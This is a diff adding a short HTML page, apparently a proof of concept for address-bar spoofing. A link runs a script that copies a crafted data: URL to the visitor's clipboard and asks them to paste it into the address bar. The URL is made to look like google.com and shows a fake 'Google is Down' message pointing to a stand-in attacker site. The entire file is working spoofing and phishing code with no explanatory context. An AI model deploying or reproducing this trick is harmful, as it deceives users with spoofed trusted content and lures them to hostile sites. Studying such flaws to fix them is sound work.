@@ -1,0 +1,19 @@
+
+
+<body><h1><br><a href=javascript:start()>Click Here</a> then Paste what you have copied in the address bar<br>
+
+<script>
+
+async function setClipboard(text) {
+  const type = "text/html";
+  const blob = new Blob([text], { type });
+  const data = [new ClipboardItem({ [type]: blob })];
+  await navigator.clipboard.write(data);
+}
+
+function start(){
+
+var textToCopy = `data://google.com/,Google%20is%20Down%0aPlease%20Visit%20https://attacker.com`;
+setClipboard(textToCopy);
+}
+</script>
